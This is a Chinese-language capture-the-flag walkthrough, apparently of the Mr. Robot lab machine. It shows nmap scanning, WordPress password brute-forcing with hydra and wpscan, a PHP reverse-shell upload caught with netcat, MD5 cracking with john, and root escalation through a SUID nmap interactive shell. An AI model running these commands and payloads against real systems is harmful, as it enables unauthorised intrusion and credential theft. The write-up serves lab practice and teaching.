# mynew
nmap 交互shell提权

# 



1、nmap 10.211.55.0/24 -sP
Nmap scan report for localhost (10.211.55.49)

2、nmap -p- 10.211.55.49
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https


3、web信息枚举

http://10.211.55.49/wp-login.php   ---wordpress博客登录界面
http://10.211.55.49/wordpresswp-login.php   ---博客外部界面AWVS扫描存在wordpress高危

http://10.211.55.49/admin/robots.txt  ---枚举出存在robots.txt
继续枚举：
http://10.211.55.49/robots.txt   ---发现fsocity.dic和key-1-of-3.txt
key-1-of-3.txt   ---这就是flag1

下载fsocity.dic：
wget http://10.211.55.49/fsocity.dic
mv fsocity.dic dayu.txt   ---发现这就是个字典，我改为txt文件更方便


4、暴力破解

post方式提交，破解web登录：hydra
1）BP抓包：
log=1&pwd=1&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.211.55.49%2Fwp-admin%2F&testcookie=1
2）hydra爆破：
hydra -L dayu.txt -p dayutest 10.211.55.49 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,F=内容是表示错误猜解的返回信息提示。） 


[80][http-post-form] host: 10.211.55.49   login: Elliot   password: dayutest

成功爆破出用户名：Elliot

5、wepscan枚举Elliot

wpscan -U Elliot -P dayu.txt --url http://10.211.55.49 -t 10000
爆破需要一段时间所以加入-t一万个线层进行爆破！
但是经过40分钟才可以爆破出来！

检查字典：发现很多重复的
Linux sort 命令用于将文本文件内容加以排序：sort 可针对文本文件的内容，以行为单位来排序。
https://www.runoob.com/linux/linux-comm-sort.html

sort dayu.txt | uniq > dayu1.txt
-u, --unique 配合-c，严格校验排序；不配合-c，则只输出一次排序结果

wpscan -U Elliot -P dayu1.txt --url http://10.211.55.49
[SUCCESS] - Elliot / ER28-0652
通过不到一分钟就成功爆破了！


7、worepress站getshell
访问：http://10.211.55.49/wp-login.php 

elliot
ER28-0652
成功登录！

点击：Appearance->Add New->Upload Theme->文件上传

cp /usr/share/webshells/php/php-reverse-shell.php .
在文件上传处上传php-reverse-shell，然后点击模块：Media
点击刚上传的文件位置！右边获得上传点连接：
http://10.211.55.49/wp-content/uploads/2022/03/php-reverse-shell.php
nc -vlp 1234

成功获得反弹shell，但是这里获得的是/bin/sh的shell在执行：
/bin/bash
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo&&fg

获得稳定的反弹shell！


8、内部信息收集

cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b   ---md5解密
https://www.somd5.com/  ---进行解密
abcdefghijklmnopqrstuvwxyz    ---获得密码

或者约翰进行暴力破解：
john -format=raw-md5 -wordlist=/usr/share/wordlists/rockyou.txt hash
abcdefghijklmnopqrstuvwxyz (?)


find / -perm -4000 2>/dev/null
/usr/local/bin/nmap   ---安装了nmap



9、提权

su robot
abcdefghijklmnopqrstuvwxyz

cat key-2-of-3.txt
822c73956184f694993bede3eb39f959

1）nmap提权
利用priv升级漏洞进行bash提权

/usr/local/bin/nmap --interactive   ---即可得到交互式shell
!whoami
!/bin/bash -p
成功获得root权限！


-------------------------------------------------------
拓展技巧
burpsuite最新版安装和暴力破解：

https://blog.csdn.net/u011781521/article/details/54772795


























































































